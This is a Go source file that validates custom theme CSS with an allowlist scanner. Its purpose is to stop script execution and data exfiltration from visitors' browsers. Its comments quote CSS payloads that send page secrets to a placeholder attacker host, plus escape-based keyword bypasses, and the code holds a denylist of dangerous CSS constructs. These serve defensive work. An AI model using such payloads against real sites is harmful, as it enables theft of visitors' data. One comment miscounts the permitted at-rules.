package theme

import (
	"fmt"
	"regexp"
	"strings"
)

// Custom CSS: parsed, not filtered.
//
// # Why not the game panel's approach
//
// The game panel sanitises custom CSS with five regular-expression replacements
// (`expression(`, `behavior:`, `-moz-binding:`, `javascript:`, `@import`) after truncating to
// 100 KiB. A blacklist of five patterns is not a parser: `\40 import`, `e\78 pression`,
// `image-set(url(https://attacker/?x=secret))`, and `@font-face{src:url(//attacker)}` all pass
// it, and the last two are what turn an operator's stylesheet into an exfiltration channel from
// every visitor's browser.
//
// # What this does instead
//
// It is a small scanner with an allowlist, not a denylist:
//
//   - the character set is restricted, and CSS escapes (backslash) are refused outright, which
//     removes the whole class of "spell the forbidden word differently" bypasses;
//   - comments are stripped before anything is inspected, so `ex/**/pression(` cannot split a
//     keyword;
//   - only five at-rules are permitted, and `@import` is not one of them;
//   - every `url()` must point at a same-origin digest asset or a raster `data:` URI, so an
//     attribute selector cannot request an arbitrary path with a secret in the query string;
//   - braces are balanced and nesting is bounded, so a stylesheet cannot swallow the rest of the
//     document;
//   - the rule and declaration counts are bounded, so a 256 KiB input cannot become a
//     multi-second parse.
//
// # Why it is here and not in internal/theme/css
//
// Validation is part of the document contract: `Validate` must be complete, and a document whose
// customCss was never checked would be a document that can only be published safely by remembering
// to call a second function. The *generator* lives in internal/theme/css, which imports this
// package; the validator lives beside the document it validates.
//
// docs/theming-system.md §5.2 recommends `github.com/tdewolff/parse/v2/css` for this job. This
// build keeps the dependency list at three modules and implements the allowlist directly; the
// behaviour it must have is the behaviour the tests in customcss_test.go pin, and those are the
// same tests a parser swap would have to keep green.

// Custom-CSS limits. They are exported so the Studio can state them.
const (
	// MaxCSSRules bounds the number of rules and at-rule blocks in one stylesheet.
	MaxCSSRules = 4096
	// MaxCSSDepth bounds nesting: media inside supports inside a rule is three.
	MaxCSSDepth = 4
	// MaxCSSDeclarations bounds the total declaration count.
	MaxCSSDeclarations = 20000
)

// allowedAtRules is the closed set. `@import`, `@charset`, `@namespace` and `@property` are
// deliberately absent: the first two are request mechanisms, the third rebinds names, and the
// fourth can register a custom property whose initial value is a `url()` the browser resolves.
var allowedAtRules = map[string]bool{
	"media":             true,
	"supports":          true,
	"keyframes":         true,
	"-webkit-keyframes": true,
	"font-face":         true,
	"page":              true,
	"layer":             true,
	"container":         true,
}

// forbiddenFragments are checked against the comment-stripped, lower-cased source. They are a
// second line of defence behind the allowlist, not the primary one: each names a construct that
// has historically been an escape hatch, and naming it makes the refusal message useful.
var forbiddenFragments = []struct{ fragment, why string }{
	{"expression(", "IE's expression() executes script"},
	{"behavior:", "behavior: loads an external script"},
	{"-moz-binding:", "-moz-binding loads external XBL"},
	{"javascript:", "a javascript: URL executes script"},
	{"@import", "@import loads an external stylesheet"},
	{"@charset", "@charset rewrites the document encoding"},
	{"@namespace", "@namespace can defeat selector reasoning"},
	{"image-set(", "image-set() can request an external URL"},
	{"-webkit-image-set(", "image-set() can request an external URL"},
	{"</", "a closing tag has no place in a stylesheet"},
}

// safeValueChars is the character set a declaration value may use.
//
// It is generous — colours, lengths, calc(), gradients, quotes, commas — and excludes only what
// has no business in a declaration: `<`, `>`, `\`, `{`, `}` (a value cannot open a block), and
// control characters.
var (
	// The value may contain `;`, `{` and `}` — inside a string or a url() — because the declaration
	// splitter has already separated declarations and the block scanner has already matched braces.
	// Excluding them here would refuse `content: "a;b"` and a base64 data URI, which are the two
	// first things an operator writes.
	declarationRe = regexp.MustCompile(`(?s)^(-{0,2}[a-zA-Z][a-zA-Z0-9-]*)\s*:\s*(.+)$`)
	urlRefRe      = regexp.MustCompile(`url\(\s*(?:"([^"]*)"|'([^']*)'|([^)'"]*))\s*\)`)
	atRuleRe      = regexp.MustCompile(`^@([a-zA-Z-]+)`)
	assetPathRe   = regexp.MustCompile(`^/(?:theme/assets|api/v1/media)/[0-9a-fA-F-]{36}$`)
	dataRasterRe  = regexp.MustCompile(`^data:image/(png|jpeg|gif|webp);base64,[A-Za-z0-9+/=\s]+$`)
)

// ValidateCustomCSS checks a custom-CSS block.
//
// It returns the first problem, named by position, because an operator editing a stylesheet needs
// to find the line rather than be told that "the CSS is invalid".
func ValidateCustomCSS(src string) error {
	if len(src) > MaxCustomCSSBytes {
		return fmt.Errorf("theme: customCss is %d bytes; the limit is %d", len(src), MaxCustomCSSBytes)
	}
	if strings.TrimSpace(src) == "" {
		return nil
	}

	stripped, err := stripCSSComments(src)
	if err != nil {
		return err
	}
	if err := checkCSSCharset(stripped); err != nil {
		return err
	}

	lower := strings.ToLower(stripped)
	for _, bad := range forbiddenFragments {
		if idx := strings.Index(lower, bad.fragment); idx >= 0 {
			return fmt.Errorf("theme: customCss must not contain %q: %s (at byte %d)",
				bad.fragment, bad.why, idx)
		}
	}

	rules, err := scanCSS(stripped)
	if err != nil {
		return err
	}
	if len(rules) > MaxCSSRules {
		return fmt.Errorf("theme: customCss has %d rules; the limit is %d", len(rules), MaxCSSRules)
	}

	declarations := 0
	for _, rule := range rules {
		if rule.atRule != "" {
			if !allowedAtRules[rule.atRule] {
				return fmt.Errorf("theme: customCss uses @%s, which is not permitted", rule.atRule)
			}
			// An at-rule's prelude must not carry a url() of its own — @font-face's is inside the
			// block, and a @media prelude has no business naming a URL.
			if err := checkURLs(rule.prelude); err != nil {
				return err
			}
		}
		for _, decl := range rule.declarations {
			declarations++
			if declarations > MaxCSSDeclarations {
				return fmt.Errorf("theme: customCss has more than %d declarations", MaxCSSDeclarations)
			}
			if err := checkDeclaration(decl, rule.selector); err != nil {
				return err
			}
		}
	}
	return nil
}

// stripCSSComments removes comments, preserving string literals.
//
// A naive `strings.Replace(src, "/*", ...)` would corrupt `content: "/*"`, and a naive regex
// would let `/*/` close early. The scanner tracks quotes so a comment marker inside a string is
// content, and an unterminated comment is an error rather than silently truncating the rest of
// the stylesheet.
func stripCSSComments(src string) (string, error) {
	var b strings.Builder
	b.Grow(len(src))
	for i := 0; i < len(src); i++ {
		c := src[i]
		if c == '"' || c == '\'' {
			quote := c
			b.WriteByte(c)
			i++
			for ; i < len(src); i++ {
				b.WriteByte(src[i])
				if src[i] == '\\' && i+1 < len(src) {
					i++
					b.WriteByte(src[i])
					continue
				}
				if src[i] == quote {
					break
				}
			}
			continue
		}
		if c == '/' && i+1 < len(src) && src[i+1] == '*' {
			end := strings.Index(src[i+2:], "*/")
			if end < 0 {
				return "", fmt.Errorf("theme: customCss has an unterminated comment at byte %d", i)
			}
			i += 2 + end + 1
			// A comment is whitespace, and two tokens either side of it must not fuse into one.
			b.WriteByte(' ')
			continue
		}
		b.WriteByte(c)
	}
	return b.String(), nil
}

// checkCSSCharset rejects characters that have no place in a stylesheet.
//
// The backslash is the important one: CSS escapes are how `@\69mport` and `e\78pression(` get
// past a keyword filter, and no legitimate theme needs one. Refusing it outright is a smaller
// rule than enumerating the escapes that are dangerous.
func checkCSSCharset(src string) error {
	for i := 0; i < len(src); i++ {
		c := src[i]
		switch {
		case c == '\\':
			return fmt.Errorf("theme: customCss must not use CSS escapes (\\ at byte %d)", i)
		case c == '<':
			return fmt.Errorf("theme: customCss must not contain %q (at byte %d)", string(c), i)
		case c < 0x20 && c != '\n' && c != '\r' && c != '\t':
			return fmt.Errorf("theme: customCss contains a control character at byte %d", i)
		case c == 0x7f:
			return fmt.Errorf("theme: customCss contains a control character at byte %d", i)
		}
	}
	return nil
}

// cssRule is one block: a selector or at-rule prelude, and its declarations.
type cssRule struct {
	selector     string
	atRule       string
	prelude      string
	declarations []string
}

// scanCSS walks the stylesheet, checking brace balance and depth and collecting blocks.
//
// It is not a full CSS parser: it does not build a selector tree, because nothing downstream
// needs one. What it must get right is where a block starts and ends, which is what stops a
// stylesheet from escaping its own braces and swallowing the generated declarations that follow
// it in the same file.
func scanCSS(src string) ([]cssRule, error) {
	var (
		rules []cssRule
		// stack holds the open blocks. Each frame is the prelude that opened it.
		stack []cssRule
		buf   strings.Builder
		quote byte
	)
	flushRule := func(text string) {
		for _, p := range splitDeclarations(text) {
			if strings.TrimSpace(p) != "" {
				stack[len(stack)-1].declarations = append(stack[len(stack)-1].declarations, p)
			}
		}
	}

	for i := 0; i < len(src); i++ {
		c := src[i]
		if quote != 0 {
			buf.WriteByte(c)
			if c == quote {
				quote = 0
			}
			continue
		}
		switch c {
		case '"', '\'':
			quote = c
			buf.WriteByte(c)
		case '{':
			if len(stack) >= MaxCSSDepth {
				return nil, fmt.Errorf("theme: customCss nests deeper than %d levels (at byte %d)", MaxCSSDepth, i)
			}
			prelude := strings.TrimSpace(buf.String())
			buf.Reset()
			if prelude == "" {
				return nil, fmt.Errorf("theme: customCss has an empty selector at byte %d", i)
			}
			frame := cssRule{selector: prelude}
			if m := atRuleRe.FindStringSubmatch(prelude); m != nil {
				frame.atRule = strings.ToLower(m[1])
				frame.prelude = prelude
			}
			stack = append(stack, frame)
		case '}':
			if len(stack) == 0 {
				return nil, fmt.Errorf("theme: customCss has an unmatched '}' at byte %d", i)
			}
			body := buf.String()
			buf.Reset()
			flushRule(body)
			done := stack[len(stack)-1]
			stack = stack[:len(stack)-1]
			if len(stack) == 0 {
				rules = append(rules, done)
			} else {
				// A nested block (an @media containing rules) contributes its declarations to the
				// enclosing frame; the nesting itself has already been depth-checked, and the
				// generated stylesheet keeps the operator's braces as written.
				parent := &stack[len(stack)-1]
				parent.declarations = append(parent.declarations, done.declarations...)
			}
		case ';':
			// A `;` at depth 0 separates statements; inside a block it separates declarations and
			// stays in the buffer so flushRule can split on it.
			if len(stack) == 0 {
				statement := strings.TrimSpace(buf.String())
				buf.Reset()
				if statement == "" {
					continue
				}
				if m := atRuleRe.FindStringSubmatch(statement); m != nil {
					// A statement at-rule such as `@layer a, b;`. Only the permitted names are
					// allowed, and only without a block.
					name := strings.ToLower(m[1])
					if !allowedAtRules[name] {
						return nil, fmt.Errorf("theme: customCss uses @%s, which is not permitted", name)
					}
					if err := checkURLs(statement); err != nil {
						return nil, err
					}
					continue
				}
				return nil, fmt.Errorf("theme: customCss has a statement outside any rule at byte %d", i)
			}
			buf.WriteByte(c)
		default:
			buf.WriteByte(c)
		}
	}
	if quote != 0 {
		return nil, fmt.Errorf("theme: customCss has an unterminated string")
	}
	if len(stack) != 0 {
		return nil, fmt.Errorf("theme: customCss has %d unclosed block(s)", len(stack))
	}
	if tail := strings.TrimSpace(buf.String()); tail != "" {
		return nil, fmt.Errorf("theme: customCss ends with %q outside any rule", truncate(tail, 40))
	}
	return rules, nil
}

// splitDeclarations splits a block body on the `;` that separates declarations.
//
// A plain strings.Split is wrong, and wrong in the two ways an operator hits first: a `;` inside a
// string (`content: "a;b"`) and a `;` inside a url() (a base64 data URI carries one after the
// media type). Both would be cut in half and then reported as a malformed declaration, so the split
// tracks quotes and parenthesis depth.
func splitDeclarations(body string) []string {
	var (
		out   []string
		buf   strings.Builder
		quote byte
		depth int
	)
	for i := 0; i < len(body); i++ {
		c := body[i]
		if quote != 0 {
			buf.WriteByte(c)
			if c == quote {
				quote = 0
			}
			continue
		}
		switch c {
		case '"', '\'':
			quote = c
			buf.WriteByte(c)
		case '(':
			depth++
			buf.WriteByte(c)
		case ')':
			if depth > 0 {
				depth--
			}
			buf.WriteByte(c)
		case ';':
			if depth > 0 {
				// A `;` inside url(...) or another function belongs to the value.
				buf.WriteByte(c)
				continue
			}
			out = append(out, buf.String())
			buf.Reset()
		default:
			buf.WriteByte(c)
		}
	}
	if tail := buf.String(); strings.TrimSpace(tail) != "" {
		out = append(out, tail)
	}
	return out
}

// checkDeclaration validates one `property: value` pair.
func checkDeclaration(raw, selector string) error {
	decl := strings.TrimSpace(raw)
	if decl == "" {
		return nil
	}
	m := declarationRe.FindStringSubmatch(decl)
	if m == nil {
		// A property with nothing after the colon is the most common way this fails, and it is a
		// different mistake from a malformed declaration, so it is named separately.
		if idx := strings.Index(decl, ":"); idx > 0 && strings.TrimSpace(decl[idx+1:]) == "" {
			return fmt.Errorf("theme: customCss has an empty value for %s in %q",
				strings.TrimSpace(decl[:idx]), truncate(selector, 40))
		}
		return fmt.Errorf("theme: customCss has a malformed declaration %q in %q",
			truncate(decl, 60), truncate(selector, 40))
	}
	property := strings.ToLower(m[1])
	value := strings.TrimSpace(m[2])
	if value == "" {
		// `color: ;` is not an error CSS refuses, but it is always a mistake in a theme, and
		// accepting it would let a value be assembled from two declarations later.
		return fmt.Errorf("theme: customCss has an empty value for %s in %q",
			property, truncate(selector, 40))
	}
	if property == "behavior" || property == "-moz-binding" {
		return fmt.Errorf("theme: customCss must not set %s", property)
	}
	return checkURLs(value)
}

// checkURLs validates every url() in a fragment.
//
// This is the exfiltration boundary. An attribute selector can only request an asset that
// already exists — a digest-addressed theme asset or a catalog image — so a stylesheet cannot
// leak a value it read from the page by appending it to a query string.
func checkURLs(fragment string) error {
	if !strings.Contains(strings.ToLower(fragment), "url(") {
		return nil
	}
	matches := urlRefRe.FindAllStringSubmatch(fragment, -1)
	if len(matches) == 0 {
		return fmt.Errorf("theme: customCss has a url( that this server cannot parse")
	}
	for _, m := range matches {
		target := m[1]
		if target == "" {
			target = m[2]
		}
		if target == "" {
			target = m[3]
		}
		target = strings.TrimSpace(target)
		switch {
		case target == "":
			return fmt.Errorf("theme: customCss has an empty url()")
		case strings.HasPrefix(target, "/") && assetPathRe.MatchString(target):
			// Same-origin, digest-addressed, already stored.
		case dataRasterRe.MatchString(target):
			// A raster data URI is inert: it cannot execute, and SVG is deliberately absent from
			// the allowlist because an SVG document can carry a script.
		default:
			return fmt.Errorf("theme: customCss url() must point at /theme/assets/<id>, "+
				"/api/v1/media/<id> or a base64 raster data URI; got %q", truncate(target, 60))
		}
	}
	// A url( that the regexp did not consume means an unbalanced or nested construct, which is
	// how a filter is bypassed.
	if strings.Count(strings.ToLower(fragment), "url(") != len(matches) {
		return fmt.Errorf("theme: customCss has a url( this server cannot parse")
	}
	return nil
}

// truncate shortens a string for an error message without splitting a rune.
func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}
